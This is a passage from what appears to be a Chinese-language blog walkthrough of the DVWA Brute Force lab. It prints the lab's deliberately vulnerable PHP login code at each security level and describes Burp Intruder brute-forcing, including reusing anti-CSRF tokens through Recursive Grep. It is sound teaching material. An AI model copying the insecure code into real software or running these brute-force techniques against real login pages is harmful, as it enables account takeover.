<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081042043.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <strong>选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。</strong></p>
<p><img src="https://img-blog.csdnimg.cn/4c752078fd534235a5080d3d1d2f576d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
]]></content>
  </entry>
  <entry>
    <title>DVWA通关详解</title>
    <url>/2021/12/08/DVWA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="Vulnerability-Brute-Force（爆破）"><a href="#Vulnerability-Brute-Force（爆破）" class="headerlink" title="Vulnerability: Brute Force（爆破）"></a>Vulnerability: Brute Force（爆破）</h1><h2 id="Security-level-is-currently-low"><a href="#Security-level-is-currently-low" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>View Source</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051056.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<span id="more"></span>

<p>分析源码：</p>
<p>没有做身份验证</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//检查变量是否设置（先看有没有Login参数）</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">//获取密码，存入pass变量中</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="comment">//获取密码</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="comment">//将密码使用md5加密</span></span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"><span class="comment">//构建SQL语句，查询结果保存在query变量中</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">//数据库查询，将查询结果保存在result变量中，查到了，保存用户具体信息；未查到，就在页面上输入错误结果，result为空</span></span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="comment">//结果存在并且返回一条记录，说明查到了</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">//查询结果关联数据row，row已经变成键值对</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line"><span class="comment">//获取登录成功图片</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line"><span class="comment">//登录成功，输出到页面上</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line"><span class="comment">//未查到，错误信息输出到页面上</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>先登录抓包，查看抓包信息，参数在URL传递，并且密码明文，没有验证码机制 ，我们一直go一直返回200，没有频次限制，可以爆破。</p>
<p>添加密码变量。</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051115.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 导入字典<img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051036.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 开始爆破 </p>
<p><img src="https://img-blog.csdnimg.cn/85e999f5639c4f6ab167fb33d7a2c61d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>按长度排序，找到特殊的那一位</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051022.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>登录成功</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051845.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="Security-level-is-currently-medium"><a href="#Security-level-is-currently-medium" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：</p>
<p>Medium级别的代码主要增加了mysql_real_escape_string函数。</p>
<p>这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击。</p>
<p>同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。</p>
<p>但是依然没有加上有效的防爆破机制。</p>
<p>依旧使用burp爆破，过程与low等级一致</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//是否存在Login变量（标签里面的name），检查是否存在Login按钮</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line"><span class="comment">//获取用户名，存入user变量里</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"><span class="comment">//user中x00，n，r，，’，”，x1a转义，防SQL注入</span></span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line"><span class="comment">//pass中x00，n，r，，’，”，x1a转义，防SQL注入</span></span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="comment">//密码加密</span></span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( <span class="number">2</span> );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-high"><a href="#Security-level-is-currently-high" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>分析源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line"><span class="comment">//如果在锁定状态就输出已被锁定</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would alLow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be alLowed to login again</span></span><br><span class="line"><span class="comment">//计算用户能再次登录的时间</span></span><br><span class="line">        <span class="variable">$last_login</span> = strtotime( <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        <span class="variable">$timeout</span>    = <span class="variable">$last_login</span> + (<span class="variable">$lockout_time</span> * <span class="number">60</span>);</span><br><span class="line">        <span class="variable">$timenow</span>    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &lt; <span class="variable">$timeout</span> ) &#123;</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>对于有token来防护csrf的，可以使用到这个功能(Recursive Grep+pitchfock)进行爆破</p>
<p>抓包发现有token</p>
<p>选择Pitchfork模式，为password和user_token 添加变量</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051142.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>将线程数设置为1（递归查找，将上一个请求的相应token作为下一个请求的payload的token，所以就不并发）</p>
<p><img src="https://img-blog.csdnimg.cn/3da1f28e795f40b791b66de848895431.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> Options -&gt; Grep-Extract模块 -&gt; add</p>
<p>进行相应设置，获取相应的token，截取相应token的前后标识，用于下次截取<img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051599.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>Redirections模块设置允许重定向，选择always</p>
<p><img src="https://img-blog.csdnimg.cn/77531b07d14d4ba1b8fe6bcf71801a7a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 设置 Payloads</p>
<p>选择第一项的密码本与low等级的相同</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051100.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>第二项的时候选择Recursive grep 并且把之前得到的token值粘贴到下方的方框中</p>
<p><img src="https://img-blog.csdnimg.cn/df63d242e9f3438fb112c1f833f1d671.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 开始爆破</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051309.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 爆破结果</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051824.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible"><a href="#Security-level-is-currently-impossible" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user 